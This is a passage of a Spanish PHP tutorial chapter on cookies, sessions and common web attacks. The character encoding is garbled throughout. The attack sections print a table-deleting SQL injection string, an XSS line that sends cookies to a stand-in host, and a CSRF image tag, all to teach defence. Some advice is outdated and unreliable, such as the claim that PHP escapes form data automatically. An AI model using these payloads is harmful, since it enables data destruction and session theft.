I"¶J<h1 class="no_toc" id="3-cookies-sesiones-y-seguridad">3. Cookies, sesiones y seguridad</h1>

<ul id="markdown-toc">
  <li><a href="#31-cookies" id="markdown-toc-31-cookies">3.1. Cookies</a>    <ul>
      <li><a href="#311-qu√©-son-las-cookies" id="markdown-toc-311-qu√©-son-las-cookies">3.1.1. ¬øQu√© son las cookies?</a></li>
      <li><a href="#312-manejando-cookies-con-php" id="markdown-toc-312-manejando-cookies-con-php">3.1.2. Manejando cookies con PHP</a></li>
    </ul>
  </li>
  <li><a href="#32-sesiones" id="markdown-toc-32-sesiones">3.2. Sesiones</a>    <ul>
      <li><a href="#321-abrir-sesiones-session_start" id="markdown-toc-321-abrir-sesiones-session_start">3.2.1. Abrir sesiones: session_start()</a></li>
      <li><a href="#322-usar-variables-de-sesi√≥n-_session" id="markdown-toc-322-usar-variables-de-sesi√≥n-_session">3.2.2. Usar variables de sesi√≥n: $_SESSION</a></li>
      <li><a href="#323-eliminar-variables-de-sesi√≥n-unset-y-session_destroy" id="markdown-toc-323-eliminar-variables-de-sesi√≥n-unset-y-session_destroy">3.2.3. Eliminar variables de sesi√≥n: unset() y session_destroy()</a></li>
    </ul>
  </li>
  <li><a href="#33-sesiones-cookies-y-control-de-acceso" id="markdown-toc-33-sesiones-cookies-y-control-de-acceso">3.3. Sesiones, cookies y control de acceso</a></li>
  <li><a href="#34-t√©cnicas-de-ataque-frecuentes" id="markdown-toc-34-t√©cnicas-de-ataque-frecuentes">3.4. T√©cnicas de ataque frecuentes</a>    <ul>
      <li><a href="#341-captura-de-id-de-sesi√≥n" id="markdown-toc-341-captura-de-id-de-sesi√≥n">3.4.1. Captura de ID de sesi√≥n</a></li>
      <li><a href="#342-inyecci√≥n-de-sql" id="markdown-toc-342-inyecci√≥n-de-sql">3.4.2. Inyecci√≥n de SQL</a></li>
      <li><a href="#343-xss-cross-site-scripting" id="markdown-toc-343-xss-cross-site-scripting">3.4.3. XSS (cross site scripting)</a></li>
      <li><a href="#344-csrf-o-xsrf-cross-site-request-forgery" id="markdown-toc-344-csrf-o-xsrf-cross-site-request-forgery">3.4.4. CSRF o XSRF (cross site request forgery)</a></li>
      <li><a href="#345-dt-directory-transversal" id="markdown-toc-345-dt-directory-transversal">3.4.5. DT (directory transversal)</a></li>
      <li><a href="#346-rfi-remote-file-inclusion" id="markdown-toc-346-rfi-remote-file-inclusion">3.4.6. RFI (remote file inclusion)</a></li>
    </ul>
  </li>
  <li><a href="#35-caso-pr√°ctico-resuelto-autenticaci√≥n-mediante-acl" id="markdown-toc-35-caso-pr√°ctico-resuelto-autenticaci√≥n-mediante-acl">3.5. Caso pr√°ctico resuelto: autenticaci√≥n mediante ACL</a>    <ul>
      <li><a href="#351-qu√©-es-la-autenticaci√≥n-mediante-acl" id="markdown-toc-351-qu√©-es-la-autenticaci√≥n-mediante-acl">3.5.1. Qu√© es la autenticaci√≥n mediante ACL</a></li>
      <li><a href="#352-una-implementaci√≥n-de-autenticaci√≥n-mediante-acl" id="markdown-toc-352-una-implementaci√≥n-de-autenticaci√≥n-mediante-acl">3.5.2. Una implementaci√≥n de autenticaci√≥n mediante ACL</a></li>
    </ul>
  </li>
  <li><a href="#36-ejercicios-propuestos" id="markdown-toc-36-ejercicios-propuestos">3.6. Ejercicios propuestos</a></li>
</ul>

<p>En este cap√≠tulo vamos a profundizar en varios aspectos de PHP de vital importancia para las aplicaciones web.</p>

<p>Por un lado, tenemos las <strong><em>cookies</em></strong> y las <strong>sesiones</strong>, dos mecanismos que permiten a la aplicaci√≥n mantener vivas algunas variables de forma indefinida.</p>

<p>Despu√©s estudiaremos un problema end√©mico a las aplicaciones web: la <strong>seguridad</strong>. En efecto, al tratarse de aplicaciones que, por definici√≥n, est√°n permanentemente conectadas a la red, son susceptibles de recibir ataques de manera continua e indiscriminada. Y, de hecho, lo hacen. Veremos cu√°les son los tipos de ataque m√°s frecuente y c√≥mo podemos proteger nuestra aplicaci√≥n contra ellos, algo en lo que juegan un papel importante las <em>cookies</em> y las variables de sesi√≥n.</p>

<p>Por √∫ltimo, nos centraremos en algo muy relacionado con la seguridad: la autenticaci√≥n de usuarios para acceder a la aplicaci√≥n. La mayor parte de las aplicaciones web necesitan un mecanismo seguro de autenticaci√≥n. Veremos en qu√© consisten las <strong>listas de control de acceso</strong> y plantearemos una implementaci√≥n muy completa en la que pondremos en pr√°ctica todo lo que hemos aprendido hasta ahora e incluso iremos un paso m√°s all√° al introducir la arquitectura MVC, que veremos en el siguiente tema.</p>

<h2 id="31-cookies">3.1. Cookies</h2>

<h3 id="311-qu√©-son-las-cookies">3.1.1. ¬øQu√© son las cookies?</h3>

<p>Las <strong><em>cookies</em></strong> son peque√±os archivos de texto enviados desde el servidor que se almacenan en el lado del cliente. Es decir, en el navegador.</p>

<p>Permiten guardar informaci√≥n de forma persistente, de manera que se mantenga entre una petici√≥n al servidor y otra. Una <em>cookie</em> puede estar viva durante minutos, horas, d√≠as o incluso indefinidamente.</p>

<p>Desde PHP, se pueden usar las <em>cookies</em> usando la funci√≥n <strong><em>setcookie()</em></strong> y el array global <strong><em>$_COOKIE</em></strong>. Vamos a ver c√≥mo.</p>

<h3 id="312-manejando-cookies-con-php">3.1.2. Manejando cookies con PHP</h3>

<h4 id="enviar-una-cookie-setcookie">Enviar una cookie: setcookie()</h4>

<p>Esta funci√≥n define una <em>cookie</em> que se enviar√° al cliente junto con el resto de las cabeceras de HTTP. Devuelve <em>true</em> si la cookie se env√≠a con √©xito o <em>false</em> en caso contrario.</p>

<p>Su sintaxis es:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nb">setcookie</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$name</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$value</span> <span class="p">[,</span> <span class="n">int</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$path</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$domain</span> <span class="p">[,</span> <span class="n">bool</span> <span class="nv">$secure</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">[,</span> <span class="n">bool</span> <span class="nv">$httponly</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">]]]]]]</span> <span class="p">)</span>
</code></pre></div></div>

<p>Las <em>cookies</em> deben enviarse <strong>antes de que el programa genere ninguna salida</strong>. Esto no es un capricho de PHP, sino una restricci√≥n del protocolo http. Por lo tanto, debes llamar a esta funci√≥n antes de hacer <em>cualquier</em> salida, incluidos espacios en blanco. En caso contrario, la <em>cookie</em> no estar√° disponible hasta que la p√°gina se recargue.</p>

<p>La funci√≥n <em>setcookie()</em> admite un mont√≥n de par√°metros, la mayor parte de ellos optativos:</p>

<ul>
  <li><strong>name</strong>: El nombre de la <em>cookie</em>. Este es el √∫nico obligatorio.</li>
  <li><strong>value</strong>: El valor de la <em>cookie</em>.</li>
  <li><strong>expire</strong>: El tiempo que la <em>cookie</em> tardar√° en expirar. Se trata de una fecha expresada en <a href="https://es.wikipedia.org/wiki/Tiempo_Unix">formato Unix</a>.</li>
  <li><strong>path</strong>: La ruta del servidor para la que la <em>cookie</em> estar√° disponible. Si se utiliza ‚Äò/‚Äô, la <em>cookie</em> estar√° disponible en la totalidad del dominio.</li>
  <li><strong>domain</strong>: El dominio para el cual la <em>cookie</em> est√° disponible.</li>
  <li><strong>secure</strong>: Si la <em>cookie</em> solo deber√≠a enviarse en caso de conexi√≥n https, pon este argument a <em>true</em>.</li>
  <li><strong>httponly</strong>: Esta <em>cookie</em> solo ser√° accesible a trav√©s de http. Es decir, no podr√° accederse a la <em>cookie</em> desde Javascript.</li>
</ul>

<p>Aqu√≠ tienes tres ejemplos de env√≠o de la misma cookie:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nv">$value</span> <span class="o">=</span> <span class="s2">"I'm your father"</span><span class="p">;</span> 

<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span> 
<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>  <span class="c1">// la cookie expira en una hora </span>
<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">,</span> <span class="s2">"/quotes/"</span><span class="p">,</span> <span class="s2">"bestquotes.com"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h4 id="recuperar-una-cookie-_cookies">Recuperar una cookie: $_COOKIES[]</h4>

<p>Para ver el contenido de una <em>cookie</em>, simplemente hay que acceder al array global <em>$_COOKIES</em>. Por ejemplo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="c1">// Imprimir una cookie individual </span>
<span class="k">echo</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"VaderQuote"</span><span class="p">];</span> 
<span class="cp">?&gt;</span> 
</code></pre></div></div>

<h4 id="borrar-una-cookie">Borrar una cookie</h4>

<p>Para forzar el borrado de una cookie en el cliente basta con enviarla con una fecha de expiraci√≥n anterior a la fecha actual. Por ejemplo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nb">setcookie</span> <span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">3600</span><span class="p">);</span>  <span class="c1">// Establece la fecha de expiraci√≥n una hora en el pasado</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h2 id="32-sesiones">3.2. Sesiones</h2>

<p>Las sesiones en PHP habilitan un mecanismo para que un script almacene variables (llamadas <strong>variables de sesi√≥n</strong>) en el servidor de manera persistente, de modo que posteriores ejecuciones de programas en el servidor solicitadas desde el mismo cliente pueden acceder a esas variables.</p>

<p>Es decir: en la pr√°ctica, <strong>las variables de sesi√≥n se comportan como si fueran variables globales a toda la aplicaci√≥n web</strong>.</p>

<p>Seguro que te hab√≠an dicho que usar variables globales es una mala idea y una p√©sima pr√°ctica de programaci√≥n. Eso es cierto y, al mismo tiempo, usarlas resulta inevitable. <em>Bienvenido/a al extravagante mundo de las aplicaciones web</em>.</p>

<p>Por ese motivo, debe reducirse el uso de las variables de sesi√≥n a lo estrictamente imprescindible. ¬øQu√© cosas resulta √∫til guardar en variables de sesi√≥n? Cosas como el ID o el nombre de un usuario logueado en un sistema o el estado de la aplicaci√≥n. Poco m√°s. Cosas peque√±as pero tremendamente importantes.</p>

<p>Cada cliente tiene su propio espacio de variables de sesi√≥n en el servidor, de manera que no se mezclan unas con otras, ni un cliente puede acceder a las variables de otro cliente.</p>

<p>La forma en la que PHP logra distinguir a los clientes entre s√≠ es envi√°ndoles, de forma transparente, una <em>cookie</em> con un valor aleatorio distinto para cada cliente. ‚ÄúDe forma transparente‚Äù significa que ni el programador ni el usuario se enteran de que esa <em>cookie</em> existe: PHP se encarga de hacerlo por su cuenta.</p>

<p>En el archivo <em>php.ini</em> se puede configurar la manera en la que PHP almacenar√° las variables de sesi√≥n (en memoria, en un fichero, etc), pero esto es irrelevante de cara a su funcionamiento y compete m√°s al administrador del sistema que al programador. Lo que a nosotros nos interesa es aprender a crear variables de sesi√≥n, asignarles valor y recuperarlo posteriormente.</p>

<h3 id="321-abrir-sesiones-session_start">3.2.1. Abrir sesiones: session_start()</h3>

<p>Antes de acceder a cualquier variable de sesi√≥n (ya sea para crearla, para modificarla o para eliminarla) necesitamos indicarle a PHP que queremos usar variables de sesi√≥n en ese programa.</p>

<p>La funci√≥n <strong><em>session_start()</em></strong> se usa para eso: habilita el acceso a las variables de sesi√≥n, es decir, crea una nueva sesi√≥n o reanuda una sesi√≥n preexistente.</p>

<p>Las sesiones admiten un nombre, por si necesitas crear sesiones separadas para el mismo cliente. No obstante, la mayor parte de las veces te bastar√° con crear sesiones sin nombre, sin necesidad de pasar ning√∫n argumento a <em>session_start()</em>.</p>

<h3 id="322-usar-variables-de-sesi√≥n-_session">3.2.2. Usar variables de sesi√≥n: $_SESSION</h3>

<p>Las variables de sesi√≥n se manipulan a trav√©s del array superglobal <strong><em>$_SESSION</em></strong>.</p>

<p>Si necesitas una variable de sesi√≥n llamada, por ejemplo, <em>nombre_usuario</em>, simplemente haz esto:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nombre_usuario'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"valor-de-la-variable"</span><span class="p">;</span>
</code></pre></div></div>

<p>Por supuesto, el valor de esa posici√≥n del array $_SESSION puede consultarse o modificarse cuando lo necesitemos, porque se trata de un array como otro cualquiera‚Ä¶ salvo que es <em>superglobal</em>, es decir, es accesible desde cualquier punto del programa.</p>

<h3 id="323-eliminar-variables-de-sesi√≥n-unset-y-session_destroy">3.2.3. Eliminar variables de sesi√≥n: unset() y session_destroy()</h3>

<p>La funci√≥n <strong>unset()</strong> se utiliza para destruir cualquier variable, incluidas las de sesi√≥n:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nombre_usuario'</span><span class="p">]);</span>
</code></pre></div></div>

<p>Si lo que deseas es destruir <em>todas</em> las variables de sesi√≥n, es preferible recurrir a <strong><em>session_destroy()</em></strong>.</p>

<p>Ahora bien, session_destroy() destruye la informaci√≥n asociada a la sesi√≥n actual, pero no elimina realmente las variables de la memoria del servidor ni borra la <em>cookie</em> de sesi√≥n del cliente.</p>

<p>Si eres un fan√°tico de la seguridad y quieres asegurarte de destruir todas las variables de sesi√≥n, puedes usar la funci√≥n <strong><em>session_unset()</em></strong>. Y, para borrar la cookie de sesi√≥n, debes usar <strong><em>setcookie()</em></strong>, como en este ejemplo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="c1">// Destruimos todas las variables de sesi√≥n (optativo)</span>
<span class="nb">session_unset</span><span class="p">();</span>

<span class="c1">// Si queremos destruir la sesi√≥n completamente, borramos tambi√©n la cookie de sesi√≥n.</span>
<span class="nv">$params</span> <span class="o">=</span> <span class="nb">session_get_cookie_params</span><span class="p">();</span>
<span class="nb">setcookie</span><span class="p">(</span><span class="nb">session_name</span><span class="p">(),</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">42000</span><span class="p">,</span>
        <span class="nv">$params</span><span class="p">[</span><span class="s2">"path"</span><span class="p">],</span> <span class="nv">$params</span><span class="p">[</span><span class="s2">"domain"</span><span class="p">],</span>
        <span class="nv">$params</span><span class="p">[</span><span class="s2">"secure"</span><span class="p">],</span> <span class="nv">$params</span><span class="p">[</span><span class="s2">"httponly"</span><span class="p">]</span>
<span class="p">);</span>

<span class="c1">// Finalmente, cerramos 0la sesi√≥n</span>
<span class="nb">session_destroy</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h2 id="33-sesiones-cookies-y-control-de-acceso">3.3. Sesiones, cookies y control de acceso</h2>

<p><em>Cookies</em> y variables de sesi√≥n se usan a menudo, por separado o de forma combinada, para controlar el acceso a una aplicaci√≥n web.</p>

<p>En este punto conviene que te hagas esta pregunta: ¬øqu√© significa ‚Äúloguearse‚Äù en una aplicaci√≥n?</p>

<p>Pi√©nsalo un momento. ¬øQu√© significa eso <em>realmente</em>?</p>

<p>Por supuesto, implica superar un formulario donde se nos pregunta nuestro nombre de usuario (o nuestro email, o alguna otra identificaci√≥n) y una contrase√±a. Pero, si lo superamos, ¬øqu√© sucede entonces?</p>

<p><strong>Autenticarse o ‚Äúloguearse‚Äù en una aplicaci√≥n significa que esa aplicaci√≥n <em>cambia de estado</em> y pasa a reconocernos como usuarios registrados</strong>. <em>Algo</em> tiene que cambiar dentro de la aplicaci√≥n, porque a partir de ese momento, y solo para nosotros, se comportar√° de un modo distinto.</p>

<p>Ese ‚Äúalgo‚Äù implica que la aplicaci√≥n recordar√° qui√©nes somos nosotros y cuales son nuestros privilegios en la aplicaci√≥n hasta que cerremos la sesi√≥n. Y sobre nosotros puede recordar muchas cosas: el nombre, los apellidos, nuestra foto de perfil‚Ä¶ Pero, sobre todas esas cosas, hay una fundamental: nuestro ID de usuario.</p>

<p>Todos los usuarios registrados tienen un ID en todos los sistemas. A la aplicaci√≥n le basta con conocer nuestro ID para recordar qui√©nes somos.</p>

<p>¬øY c√≥mo ‚Äúrecuerda‚Äù una aplicaci√≥n web un dato como ese? Muy f√°cil: almacen√°ndolo en una <em>cookie</em> o en una variable de sesi√≥n, que son persistentes hasta que el programa decide destruirlas. Es decir, cuando el usuario abandona la aplicaci√≥n, el programa debe destruir la <em>cookie</em> o destruir la sesi√≥n.</p>

<p>Justo en este momento hay una cosa que tiene que quedarte muy clara: <strong>¬°ninguno de estos m√©todos es completamente seguro!</strong>.</p>

<p>Las <em>cookies</em> pueden rastrearse o modificarse en el ordenador del cliente. Adem√°s, algunos clientes las tienen desactivadas. ¬°No te puedes fiar de ellas!</p>

<p>Las variables de sesi√≥n, en principio m√°s seguras, pueden ser atacadas capturando el ID de sesi√≥n, como veremos m√°s adelante.</p>

<p>El m√©todo m√°s seguro, y el m√°s complicado de programar, es el que combina:</p>

<ul>
  <li>Cookies y/o variables de sesi√≥n.</li>
  <li>Variables guardadas en una tabla de la BD.</li>
</ul>

<p>El uso de <em>frameworks</em> solventes (como Laravel, que estudiaremos m√°s adelante) hace innecesario tomarse este trabajo, puesto que todos habilitan un mecanismo de sesiones seguras que mejora notablemente las prestaciones de las sesiones nativas de PHP.</p>

<p>No obstante, en las actividades resueltas y propuestas del final del tema plantearemos una soluci√≥n para la autenticaci√≥n de usuarios desarrollada por nosotros mismos y que resultar√° razonablemente segura.</p>

<h2 id="34-t√©cnicas-de-ataque-frecuentes">3.4. T√©cnicas de ataque frecuentes</h2>

<p>(Esta secci√≥n est√° adaptada de <a href="securitybydefault.com">securitybydefault.com</a>)</p>

<p>Cualquier aplicaci√≥n web, por el mero hecho de estar abierta a recibir informaci√≥n procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o despu√©s, cualquier aplicaci√≥n que est√© <em>online</em> acaba por ser atacada. Es una certeza matem√°tica.</p>

<p>En esta secci√≥n vamos a describir qu√© tipos de ataque son los m√°s frecuentes.</p>

<p>Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una idea com√∫n a todas: lo m√°s seguro es utilizar un <em>framework</em> como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad.</p>

<p>A√∫n as√≠, conviene que conozcas con qu√© tipos de ataque te vas a encontrar y cuales son las formas de defenderse de ellos.</p>

<h3 id="341-captura-de-id-de-sesi√≥n">3.4.1. Captura de ID de sesi√≥n</h3>

<p>Como ya hemos visto, el ID de una sesi√≥n se guarda como una <em>cookie</em> (llamada generalmente <em>phpsessid</em>) en el cliente para distinguir a ese cliente de otros a la hora de acceder a las variables de sesi√≥n. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente.</p>

<p>Un atacante que est√© escuchando en esa red puede <strong>leer la cookie con el ID de sesi√≥n del paquete http</strong> y, de ese modo, <strong>suplantar la identidad</strong> de la persona que inici√≥ la sesi√≥n. Tambi√©n puede inyectar Javascript a su v√≠ctima para capturar de ese modo el ID de sesi√≥n, con id√©nticos resultados.</p>

<p>Por √∫ltimo, si el atacante consigue tener acceso, aunque sea por unos minutos, al ordenador de su v√≠ctima, puede robar el ID de sesi√≥n (que en el cliente siempre se almacena como texto plano) y suplantarlo con toda comodidad.</p>

<p>Soluciones:</p>

<ul>
  <li>Combinar las variables de sesi√≥n con <em>cookies</em> o con entradas en la base de datos.</li>
  <li>Cambiar el ID de sesi√≥n peri√≥dicamente.</li>
  <li>No confiar en variables de sesi√≥n de PHP para almacenar informaci√≥n muy sensible.</li>
  <li>Denegar el acceso a la <em>cookie</em> de sesi√≥n desde Javascript (usando el atributo <em>httponly</em>).</li>
  <li>Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesi√≥n viaja encriptada hasta el navegador. Este es uno de los muchos motivos por los que https se ha impuesto definitivamente a lo largo y ancho de la web.</li>
</ul>

<h3 id="342-inyecci√≥n-de-sql">3.4.2. Inyecci√≥n de SQL</h3>

<p>Este ataque consiste en que <strong>un usuario malintencionado ejecuta sentencias SQL contra la base de datos</strong> del sitio web mediante el simple procedimiento de insertarlas en un formulario.</p>

<p>¬øQu√© c√≥mo narices se hace eso? Te lo explico con un ejemplo. Imagina que nuestro atacante ha hecho la suposici√≥n de que nuestra tabla de usuarios se llama <em>users</em> (una suposici√≥n muy razonable). Entonces, el t√≠o, o la t√≠a, llega al formulario de login de la aplicaci√≥n, donde se nos pide el <em>nick</em> y la contrase√±a, y escribe esto en el campo <em>nick</em>:</p>

<p><img src="/docs/dwes/_site/assets/images/03-formulario-inyeccion-sql.png" alt="Ataque por inyecci√≥n SQL" /></p>

<p>Cuando pulse el bot√≥n <em>‚ÄúSign in‚Äù</em> ocurrir√° algo muy curioso‚Ä¶ y muy desagradable. Dentro de nuestro c√≥digo fuente, seguramente tendremos una l√≠nea parecida a esta:</p>

<p><code>
$sql = "SELECT * FROM users WHERE nick = '$nick' and passwd = '$pass'";
</code></p>

<p>F√≠jate otra vez en lo que el atacante ha escrito en el campo <em>nick</em> del formulario de login. Eso significa que la variable <em>$nick</em> tendr√° este contenido: <code class="language-plaintext highlighter-rouge">nada'; DELETE * FROM users; #</code>. Imagina lo que va a suceder cuando esa variable se expanda dentro de la sentencia SQL anterior.</p>

<p>¬øTe lo has imaginado ya?</p>

<p>Por si acaso a√∫n no lo has pillado, te lo chivo. Lo que suceder√° es que, al expandir la variable <em>$nick</em> en ese string, la variable <em>$sql</em> pasar√° a tener este valor:</p>

<p><code>
SELECT * FROM users WHERE nick ='<strong>nada';
DELETE * FROM users;
#</strong>'and passwd = '$pass'
</code></p>

<p>(He puesto en negrita el contenido de la variable <em>$nick</em> expandido dentro del string <em>$sql</em>)</p>

<p>Es decir, que el atacante ha logrado convertir un inofensivo <em>SELECT</em> en una secuencia de dos instrucciones. Y una de ellas no es nada inofensiva.</p>

<p>En efecto, cuando pidamos a la base de datos que ejecute ese SQL, las sentencias se ejecutar√°n en orden. El primer SELECT no devolver√° ning√∫n resultado, pero es sint√°cticamente correcto y, en cualquier caso, al atacante no le interesan esos resultados.</p>

<p>Como el SELECT es sint√°cticamente correcto, la base de datos no se detendr√° ah√≠, sino que seguir√° ejecutando las sentencias. Y le llegar√° el turno al DELETE. ¬°Bingo! El simp√°tico atacante acaba de cepillarse nuestra tabla de usuarios.</p>

<p>(Lo que haya a continuaci√≥n del s√≠mbolo # se ignorar√°, porque ese es el s√≠mbolo de comentario en SQL).</p>

<p>El atacante no solo puede ejecutar un DELETE mediante este sencillo procedimiento, sino que puede llevar a cabo otras acciones destructivas (¬øqu√© tal un DROP DATABASE?) o instrusivas (puede intentar insertar un usuario administrador fraudulento en la tabla <em>users</em>, por ejemplo). Y todo ello partiendo de una suposici√≥n bastante plausible: que la tabla de usuarios se llama <em>users</em>.</p>

<p>Para blindarse frente a inyecciones de SQL, se recomienda:</p>

<ul>
  <li><strong>Filtrar los datos procedentes de los formularios. SIEMPRE</strong>. Por ejemplo, si los nombres de usuario s√≥lo pueden estar compuestos por letras y n√∫meros, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, almohadillas, etc.</li>
  <li><strong>Escapar los caracteres especiales</strong> de cualquier dato de entrada antes de enviarlo al gestor de bases de datos. Por ejemplo, <em>mysql_real_escape_string()</em> coloca barras invertidas antes de ciertos caracteres. <em>addslashes()</em> hace algo parecido. Esto hace que ya no se ejecuten como sentencias SQL. En las versiones recientes de PHP, el escape de caracteres especiales se hace autom√°ticamente con cualquier dato que llegue por GET o POST.</li>
  <li><strong>Usar nombres poco habituales para las tablas</strong> de la base de datos. Una estrategia frecuente es utilizar un identificador significativo (como <em>users</em> para la tabla de usuarios) y a√±adirle varios caracteres o n√∫meros aleatorios (as√≠, la tabla se convertir√≠a en algo como <em>users_58283</em>). Ese sufijo aleatorio se suele almacenar en un archivo de configuraci√≥n para que est√© accesible para todos los scripts del programa. Esta t√©cnica tan simple dificulta enormemente cualquier intento de acceso fraudulento a las tablas.</li>
</ul>

<h3 id="343-xss-cross-site-scripting">3.4.3. XSS (cross site scripting)</h3>

<p>El ataque por XSS consiste en <strong>ejecutar c√≥digo de scripting malicioso</strong> (b√°sicamente, Javascript) en el contexto del sitio web.</p>

<p>Hay muchas formas de hacer XSS. Por ejemplo, imag√≠nate que tenemos un blog de noticias y que un usuario malicioso publica, <em>como parte del texto de una entrada</em>, este string:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://otrositio.com</span><span class="dl">'</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>¬øQu√© ocurrir√≠a? Pues que cada vez que alguien visite nuestro portal y cargue esa noticia, ser√° redirigido a <em>otrositio.com</em>, donde probablemente pretender√°n venderle medicamentos para la disfunci√≥n er√©ctil o algo por el estilo.</p>

<p>Otra cosa que suele hacerse con XSS es robar datos de las <em>cookies</em> del cliente, aprovechando que Javascript puede acceder a las <em>cookies</em>. Para ello, el atacante solo tiene que inyectar un c√≥digo como este:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://otrositio.com?cookies=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Para evitar los ataques XSS, la estrategia m√°s √∫til, otra vez, es <strong>filtrar todos los datos externos</strong>. El filtrado de datos es sencillo de hacer y te ahorrar√° mogoll√≥n de problemas. En resumen: <strong>nunca</strong> te f√≠es de ning√∫n dato que provenga de un formulario si no lo has filtrado antes y le has quitado todos los caracteres sospechosos.</p>

<h3 id="344-csrf-o-xsrf-cross-site-request-forgery">3.4.4. CSRF o XSRF (cross site request forgery)</h3>

<p>Este tipo de ataques <strong>explota la confianza que tiene un sitio web en la identidad de un usuario</strong>. Es decir, se toma a un usuario v√°lido registrado en un sitio (por ejemplo, sitio-confiable.com) y, desde otro sitio (por ejemplo, sitio-maligno.com), se le fuerza a hacer algo chungo en sitio-confiable.com.</p>

<p>Ve√°moslo con un ejemplo. Sup√≥n que eres un usuario administrador en sitio-confiable.com. Para borrar a un usuario de tu web (o cualquier otro recurso), lanzas una URL como https://sitio-confiable.com/usuario/delete/28 (donde 28 es el id del usuario). Este tipo de URLs son muy habituales en las aplicaciones web.</p>

<p>Pues bien, imagina que has abierto una sesi√≥n como administrador en sitio-confiable.com y, sin cerrarla, navegas por otra web llamada sitio-maligno.com. Y un atacante supermalvado, conocedor de tu propensi√≥n a navegar por sitios chungos sin cerrar la sesi√≥n en sitio-confiable.com, ha colocado este c√≥digo como parte del c√≥digo fuente de sitio-maligno.com:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'https://sitio-confiable.com/usuario/delete/28'</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>Cuando tu navegador cargue esa p√°gina, lanzar√° una petici√≥n GET a sitio-confiable.com, resultando en la eliminaci√≥n del usuario 28 sin que t√∫ te enteres de c√≥mo ha podido suceder semejante desgracia.</p>

<p>Esto es solo un ejemplo. Por supuesto, el atacante puede hacer un mont√≥n de cosas desagradables en sitio-confiable.com, porque ese sitio est√° confiando en ti, que eres un usuario leg√≠timo con una sesi√≥n abierta.</p>

<p>Puedes pensar: ¬øy qui√©n demonios se va a dejar una sesi√≥n abierta y se va a poner a navegar por otros sitios sin cerrarla? Respuesta: <em>todo</em> el mundo. Si t√∫ no lo has hecho nunca, aunque solo haya sido una vez, probablemente no perteneces a la especie humana.</p>

<p>Algunas t√©cnicas para dificultar el ataque por CSRF:</p>

<ul>
  <li><strong>Utilizar POST en lugar de GET</strong> para recibir datos.</li>
  <li><strong>Generar tokens √∫nicos para cada petici√≥n</strong>. Un t√≥ken es una cadena alfanum√©rica aleatoria generada por el servidor cuando sirve el c√≥digo HTML de un formulario. El cliente debe enviar de vuelta ese t√≥ken junto con los datos del formulario para que el servidor acepte la petici√≥n como v√°lida. Si un atacante intenta efectuar un ataque CSRF, enviar√° sus peticiones sin el t√≥ken y ser√°n rechazadas.</li>
</ul>

